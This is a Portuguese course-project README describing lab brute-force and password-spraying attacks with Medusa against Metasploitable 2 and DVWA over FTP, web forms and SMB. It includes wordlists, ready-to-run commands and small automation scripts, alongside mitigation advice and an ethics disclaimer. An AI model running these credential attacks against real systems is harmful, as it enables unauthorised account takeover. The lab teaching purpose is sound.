# Entendendo Desafio — Projeto DIO

> **Resumo:** Implementação, documentação e experimentação de ataques de força bruta em ambiente controlado usando **Kali Linux** e **Medusa**, contra máquinas vulneráveis (ex.: **Metasploitable 2**, **DVWA**), com levantamento, automação e recomendações de mitigação. Este repositório serve como portfólio técnico para submissão na DIO.

---

## Aviso Legal e Ético

Este projeto é estritamente **educacional** e deve ser executado **apenas** em ambientes controlados e com permissão explícita (por exemplo: VMs locais criadas por você para laboratório). Atacar sistemas sem autorização é crime. Você é responsável pelo uso das instruções aqui contidas.

---

## Objetivos

* Compreender ataques de força bruta em FTP, formulários web (DVWA) e SMB.
* Aprender a usar **Kali Linux** e **Medusa** para auditoria em ambiente controlado.
* Documentar passo a passo os testes, wordlists e comandos.
* Propor e justificar medidas de mitigação.
* Publicar a documentação e evidências no GitHub como portfólio.

---

## Estrutura do repositório

```
/ (root)
├─ README.md                # este arquivo
├─ wordlists/
│  ├─ small-words.txt
│  └─ common-usernames.txt
├─ scripts/
│  ├─ medusa_ftp.sh
│  └─ medusa_smb_spray.sh
├─ images/                  # capturas de tela (opcional)
└─ report.md                # relatório final longo (opcional)
```

---

## Pré-requisitos

* Host com VirtualBox instalado.
* Imagens ISO/VMs: **Kali Linux** (apenas download oficial), **Metasploitable 2** e/ou DVWA (pode rodar em uma VM Linux ou Docker). Não use ambientes de produção.
* Conexão de rede configurada em modo **Host-Only** ou **Internal Network** entre as VMs.
* Medusa instalado (Kali já traz, ou `sudo apt install medusa`).

---

## Configurando o ambiente (exemplo)

1. Criar duas VMs no VirtualBox:

   * `Kali` (attacker)
   * `Metasploitable2` (target) ou outra VM com DVWA configurada.
2. Ajustar adaptadores de rede para `Host-Only Adapter` ou `Internal Network` (mesma rede entre VMs).
3. Verificar conectividade:

   ```bash
   # no Kali
   ip addr show
   ping -c 3 <IP_DO_TARGET>
   nmap -sV -p- <IP_DO_TARGET>
   ```

---

## Wordlists (exemplo)

Crie `wordlists/small-words.txt` com entradas simples (apenas para laboratório):

```
123456
password
admin
kali
root
qwerty
letmein
```

E `wordlists/common-usernames.txt`:

```
root
admin
user
test
www-data
```

> Dica: não use listas grandes em redes alheias — em laboratório, mantenha listas pequenas para economia de recursos e registro claro das tentativas.

---

## Testes com Medusa — exemplos de comandos

A seguir há comandos de exemplo para documentar seus testes. Ajuste IPs, caminhos e parâmetros conforme seu ambiente.

### 1) Ataque de força bruta em FTP

```bash
# ataque FTP com usuário único e wordlist
medusa -h 192.168.56.101 -u anonymous -P wordlists/small-words.txt -M ftp -t 8

# ataque FTP com lista de usuários + lista de senhas (userfile + passfile)
medusa -h 192.168.56.101 -U wordlists/common-usernames.txt -P wordlists/small-words.txt -M ftp -t 10
```

Registre: tempo total, número de tentativas, credenciais válidas encontradas (se houver).

### 2) Força bruta em formulário web (DVWA)

Medusa possui o módulo `http_form` para formularios. Um exemplo genérico:

```bash
medusa -h 192.168.56.102 -U wordlists/common-usernames.txt -P wordlists/small-words.txt -M http_form -m FORM:/dvwa/vulnerabilities/brute/:username:password:POST:/dvwa/vulnerabilities/brute/:"Login failed" -T 10
```

Explicação rápida dos parâmetros do módulo `http_form` (usado acima):

* `FORM:<path>:<userfield>:<passfield>:<method>:<success-string>`
* Ajuste o `<path>` e o `<success-string>` com base no comportamento do DVWA instalado.

> Observação: os formulários web costumam exigir tokens CSRF ou cookies; para testes mais simples, desative proteção CSRF no DVWA (apenas em laboratório) ou capture o fluxo e adapte o módulo/params.

### 3) Password spraying / enumeração SMB

Exemplo de password spraying em SMB (usando medusa):

```bash
# spray com lista de usuários e lista de senhas no serviço smb
medusa -h 192.168.56.101 -U wordlists/common-usernames.txt -P wordlists/small-words.txt -M smb -t 8
```

Registre quais usuários retornam respostas diferentes (possível indicação de existência de conta). Combine com enumeração (e.g., `enum4linux`, `smbclient`) para coletar mais informações.

---

## Scripts de automação (exemplos)

Você pode criar scripts no diretório `scripts/` para repetir testes e gerar logs.

**scripts/medusa_ftp.sh** (exemplo):

```bash
#!/bin/bash
TARGET=192.168.56.101
USERFILE=../wordlists/common-usernames.txt
PASSFILE=../wordlists/small-words.txt
OUT=../report_ftp_$(date +%F_%T).log

medusa -h $TARGET -U $USERFILE -P $PASSFILE -M ftp -t 8 | tee $OUT
```

**scripts/medusa_smb_spray.sh** (exemplo):

```bash
#!/bin/bash
TARGET=192.168.56.101
USERFILE=../wordlists/common-usernames.txt
PASSFILE=../wordlists/small-words.txt
medusa -h $TARGET -U $USERFILE -P $PASSFILE -M smb -t 8
```

> Dê permissão de execução: `chmod +x scripts/*.sh`.

---

## Coleta de evidências e documentação

* Salve logs e redirecione a saída dos comandos para arquivos (`tee` ou `>`).
* Tire capturas de tela das fases importantes (nmap, medusa encontrando credenciais, shells, etc.) e coloque em `/images`.
* Registre tempo, versões de software (Kali, Medusa), e qualquer ajuste de configuração (e.g., desativar CSRF no DVWA).

---

## Validação e recomendações de mitigação

Para cada vulnerabilidade/teste documentado, inclua:

* **Descrição do risco** (o que acontece quando a credencial é comprometida).
* **Como foi detectado** (comando do Medusa e saída relevante).
* **Recomendações práticas**:

  * Implementar bloqueio temporário após N tentativas falhas (account lockout / throttling).
  * Utilizar autenticação multifator (MFA) onde aplicável.
  * Forçar senhas fortes e políticas de expiração.
  * Monitorar e alugar alertas de tentativas de login incomuns.
  * Restringir serviços desnecessários e aplicar firewall/ACLs na rede interna.

---

## Resultados esperados e formato de entrega

* Arquivo `README.md` (este) ou `report.md` com passos detalhados.
* Wordlists e scripts em pastas dedicadas.
* Capturas de tela em `/images` (opcional).
* Link público do repositório GitHub para submissão.

---

## Referências úteis

* Documentação oficial do Kali Linux
* Documentação do Medusa
* DVWA — Damn Vulnerable Web Application
* Nmap — Manual

(Adicione links na versão final do seu repositório se desejar.)

---

## Próximos passos / Check-list antes de enviar

* [ ] Executar todos os testes em ambiente controlado
* [ ] Salvar logs e capturas de tela
* [ ] Redigir `report.md` com análise e mitigação
* [ ] Subir tudo para um repositório público no GitHub

---

**Boa sorte!** Documente bem a sua jornada — evidências claras e explicações técnicas vão destacar seu perfil na DIO.
